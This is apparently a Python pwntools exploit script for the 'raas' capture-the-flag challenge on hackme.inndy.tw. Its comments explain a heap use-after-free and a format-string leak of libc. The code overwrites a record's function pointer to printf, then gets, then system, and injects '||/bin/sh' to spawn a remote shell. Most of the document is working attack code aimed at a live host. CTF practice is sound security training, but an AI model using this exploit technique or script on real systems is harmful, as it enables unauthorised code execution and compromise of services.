from pwn import *
from struct import *

#
# Essential Tech Knowledges for This Challenge:
#	1. How Heap Work
#		Reference:
#			https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
#			https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400
#	2. How Format String Vulnerability Work
#		Reference:
#			https://www.youtube.com/watch?v=0WvrSfcdq1I&index=18&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
#			https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20#
#
# Idea:
#   1. Create Record[0] and Record[1] both saving a number
#   2. Free Record[0], and then free Record[1]
#   ** So the fastbin queue will be :
#   
#          Start : Record[1] -> Record[0]
#
#   3. Create Record[2] saving 12 bytes string
#   ** When creating Record[2], because of the size, 
#      the address will be same as Record[1]
#      The fastbin queue will be:
#
#          Start : Record[0]
#
#      And the address of 12 bytes string will be same as Record[0]
#      So, We can use the 12 bytes to do Use-After-Free Attack
#
#   If we rewrite the "void (*print)" function pointer to system@plt successfully,
#   the function "do_dump()" will do :
#
#       int idx = ask("Index");
#       system(records[idx]);
#
#   Because the string pointed by records[idx] is:
#
#       ____________...
#       xxxxyyyyyyyy
#
#       x: system@plt address
#       y: input
#
#   and '||' operator of bash.
#
#   command1 || command2
#   Only if command1 return fail, bash will run command2
#   
#   We can input "||/bin/sh"
#
#   So, system@plt address will be taken as command1.
#   Obviously, command1 will return fail, and then command2, /bin/sh, will be executed
#   
#   Now, Yeah~~~~, We get the shelllllllllllll
#
#   But, we can only input 12 bytes, which isn't enoght for this solution
#
#   So, I want to rewrite the function pointer to 'gets' firstly.
#   and function "do_dump()" will do:
#   
#       int idx = ask("Index");
#       gets(records[idx]);
#
#   By this, we can write as more as we want to the address pointed by records[idx]
#   And for this, we need to leak libc address.
#   My solution is:
#
#   1. Rewriting the fp to printf@plt
#   2. Using "Format String Vulnerability" to observe memory
#   
#   BANG! Get the address of "gets"
#
#
#
#   But, I encounter a setback again.
#   The question is, this exploit works at my local, but didn't at inndy's host.
#   Finally I knew the key point, the glibc at my local wasn't same as inndy's host.
#   So I download the glibc inndy's host using, using following command to find offset:
#
#       readelf -s libc-2.23.so.i386 | grep -E '(main|gets)@@'
#
#   And got the following result:
#
#       2269: 0005f2c0   411 FUNC    GLOBAL DEFAULT   13 _IO_gets@@GLIBC_2.0
#       2282: 00018540   486 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.0
#
#   By using this offset, this exploit finally can work at inndy's host.
#
#   If you want to run this exploit at your localhost,
#   you need to find out what verstion of glibc your localhost using,
#   find the offset of __libc_star_main and _IO_gets,
#   and use them to caculate the _IO_gets address.
#

def interaction(r, delims, msg):
    recv = r.recvuntil(delims)
    print recv
    r.sendline(msg)
    print msg
    return recv

# The offset table of inndy's host
__LIBC_START_MAIN_OFFSET = 0x18540
_IO_GETS_OFFSET = 0x5f2c0
# The offset table of my localhost
#__LIBC_START_MAIN_OFFSET = 0x18540
#_IO_GETS_OFFSET = 0x5e890


#r = process('./raas')
r = remote('hackme.inndy.tw', 7719)
#r = remote('localhost', 5566)

PRINTF_PLT = 0x08048480
SYSTEM_PLT = 0x080484f0

# Act >
interaction(r, '>', '1')
# Index >
interaction(r, '>', '0')
# Type >
interaction(r, '>', '1')
# Value >
interaction(r, '>', '87') # Give a arbitrary number

# Act >
interaction(r, '>', '1')
# Index >
interaction(r, '>', '1')
# Type >
interaction(r, '>', '1')
# Value >
interaction(r, '>', '87') # Give a arbitrary number

# Act > 
interaction(r, '>', '2')
# Index >
interaction(r, '>', '0')

# Act > 
interaction(r, '>', '2')
# Index >
interaction(r, '>', '1')

payload = ''
payload += struct.pack('<I', PRINTF_PLT)
payload += '%15$x'
# Act >
interaction(r, '>', '1')
# Index >
interaction(r, '>', '2')
# Type >
interaction(r, '>', '2')
# Length >
interaction(r, '>', '12')
# Value >
interaction(r, '>', payload)

# Act >
interaction(r, '>', '3')
# Index >
interaction(r, '>', '0')

# Act >
tmp = interaction(r, '>', '2')
# Index >
interaction(r, '>', '2')

LIBC_BASE = int(tmp[5:13], 16) - 247 - __LIBC_START_MAIN_OFFSET
GETS = LIBC_BASE + _IO_GETS_OFFSET
payload = ''
payload += struct.pack('<I', GETS)
print 'GETS Address------------------'
print hex(GETS)
print '------------------------------'
# Act >
interaction(r, '>', '1')
# Index >
interaction(r, '>', '3')
# Type >
interaction(r, '>', '2')
# Length >
interaction(r, '>', '12')
# Value >
interaction(r, '>', payload)

# Act >
interaction(r, '>', '3')
# Index >
interaction(r, '>', '0')

# Gets
payload = ''
payload += struct.pack('<I', SYSTEM_PLT)
payload += '||/bin/sh'
r.sendline(payload)

# Act >
interaction(r, '>', '3')
# Index >
interaction(r, '>', '0')

r.interactive()
